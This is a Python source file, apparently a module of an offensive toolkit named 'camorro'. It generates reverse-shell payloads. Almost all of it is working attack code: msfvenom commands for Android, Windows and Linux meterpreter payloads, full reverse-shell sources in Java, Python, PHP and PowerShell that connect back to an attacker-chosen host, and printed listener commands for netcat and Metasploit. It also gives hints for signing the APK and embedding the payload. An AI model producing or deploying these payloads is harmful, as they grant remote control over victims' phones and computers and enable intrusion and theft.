import os
import subprocess
import sys

class PayloadModule:
    def __init__(self):
        self.payloads_dir = os.path.expanduser("~/camorro/payloads")
        os.makedirs(self.payloads_dir, exist_ok=True)
    
    def run(self):
        while True:
            print("\n" + "─" * 50)
            print("  PAYLOAD GENERATOR")
            print("─" * 50)
            print("  [1] Android APK Reverse Shell (msfvenom)")
            print("  [2] Android APK Reverse Shell (custom bind)")
            print("  [3] Windows EXE Reverse Shell")
            print("  [4] Python Reverse Shell")
            print("  [5] PHP Reverse Shell")
            print("  [6] Linux ELF Reverse Shell")
            print("  [7] Create Staged Payload (PowerShell)")
            print("  [0] Back to Main Menu")
            print("─" * 50)
            
            choice = input("\n  Payload > ").strip()
            
            if choice == "0":
                break
            elif choice == "1":
                self.android_apk_msfvenom()
            elif choice == "2":
                self.android_apk_custom()
            elif choice == "3":
                self.windows_exe()
            elif choice == "4":
                self.python_revshell()
            elif choice == "5":
                self.php_revshell()
            elif choice == "6":
                self.linux_elf()
            elif choice == "7":
                self.powershell_staged()
            else:
                print("  [!] Invalid option.")
    
    def get_lhost_lport(self):
        lhost = input("  LHOST (your IP): ").strip()
        lport = input("  LPORT (your port): ").strip()
        return lhost, lport
    
    def android_apk_msfvenom(self):
        lhost, lport = self.get_lhost_lport()
        output = os.path.join(self.payloads_dir, "payload.apk")
        cmd = f"msfvenom -p android/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -o {output}"
        print(f"\n  [*] Generating APK payload...")
        print(f"  [*] Command: {cmd}")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"  [+] Payload saved to: {output}")
            print(f"  [+] Sign the APK with: jarsigner or apksigner")
            self.post_payload_message(lhost, lport)
        else:
            print(f"  [!] Error: {result.stderr}")
    
    def android_apk_custom(self):
        """توليد APK بايلود بطريقة مختلفة بدون msfvenom"""
        lhost, lport = self.get_lhost_lport()
        
        # إنشاء ملف كود جافا للسماح بتخصيص البايلود
        payload_java = f"""
package com.camorro;

import java.io.*;
import java.net.*;

public class CamorroMain {{
    public static void main(String[] args) {{
        try {{
            Socket socket = new Socket("{lhost}", {lport});
            Process process = Runtime.getRuntime().exec("sh");
            new Thread(() -> {{
                try {{
                    InputStream in = socket.getInputStream();
                    OutputStream out = process.getOutputStream();
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = in.read(buffer)) != -1) {{
                        out.write(buffer, 0, len);
                    }}
                }} catch (Exception e) {{}}
            }}).start();
            new Thread(() -> {{
                try {{
                    InputStream in = process.getInputStream();
                    OutputStream out = socket.getOutputStream();
                    byte[] buffer = new byte[1024];
                    int len;
                    while ((len = in.read(buffer)) != -1) {{
                        out.write(buffer, 0, len);
                    }}
                }} catch (Exception e) {{}}
            }}).start();
            process.waitFor();
            socket.close();
        }} catch (Exception e) {{}}
    }}
}}
"""
        # حفظ الكود في ملف
        java_dir = os.path.join(self.payloads_dir, "camorro_payload")
        os.makedirs(java_dir, exist_ok=True)
        with open(os.path.join(java_dir, "CamorroMain.java"), "w") as f:
            f.write(payload_java)
        
        print(f"\n  [*] Custom Java payload created at: {java_dir}/CamorroMain.java")
        print(f"  [*] Compile with: javac CamorroMain.java")
        print(f"  [*] Then embed into an APK")
        self.post_payload_message(lhost, lport)
    
    def windows_exe(self):
        lhost, lport = self.get_lhost_lport()
        output = os.path.join(self.payloads_dir, "payload.exe")
        cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f exe -o {output}"
        print(f"\n  [*] Generating Windows EXE...")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"  [+] Payload saved to: {output}")
        else:
            print(f"  [!] Error: {result.stderr}")
    
    def python_revshell(self):
        lhost, lport = self.get_lhost_lport()
        code = f'''#!/usr/bin/env python3
import socket, subprocess, os, pty
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("{lhost}", {lport}))
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)
pty.spawn("/bin/sh")
'''
        output = os.path.join(self.payloads_dir, "revshell.py")
        with open(output, "w") as f:
            f.write(code)
        os.chmod(output, 0o755)
        print(f"\n  [+] Python revshell saved to: {output}")
        self.post_payload_message(lhost, lport)
    
    def php_revshell(self):
        lhost, lport = self.get_lhost_lport()
        code = f'''<?php
set_time_limit(0);
$sock = fsockopen("{lhost}",{lport});
$proc = proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock), $pipes);
proc_close($proc);
?>
'''
        output = os.path.join(self.payloads_dir, "revshell.php")
        with open(output, "w") as f:
            f.write(code)
        print(f"\n  [+] PHP revshell saved to: {output}")
    
    def linux_elf(self):
        lhost, lport = self.get_lhost_lport()
        output = os.path.join(self.payloads_dir, "payload.elf")
        cmd = f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf -o {output}"
        print(f"\n  [*] Generating Linux ELF...")
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"  [+] Payload saved to: {output}")
        else:
            print(f"  [!] Error: {result.stderr}")
    
    def powershell_staged(self):
        lhost, lport = self.get_lhost_lport()
        code = f'''$client = New-Object System.Net.Sockets.TCPClient("{lhost}",{lport});
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{{0}};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    $sendback = (iex $data 2>&1 | Out-String );
    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}};
$client.Close()
'''
        output = os.path.join(self.payloads_dir, "revshell.ps1")
        with open(output, "w") as f:
            f.write(code)
        print(f"\n  [+] PowerShell revshell saved to: {output}")
        self.post_payload_message(lhost, lport)
    
    def post_payload_message(self, lhost, lport):
        print(f"\n  ─── Set up listener ───")
        print(f"  nc -lvnp {lport}")
        print(f"  Or use: msfconsole -q -x 'use multi/handler; set LHOST {lhost}; set LPORT {lport}; exploit'")
        print(f"  ───────────────────────")
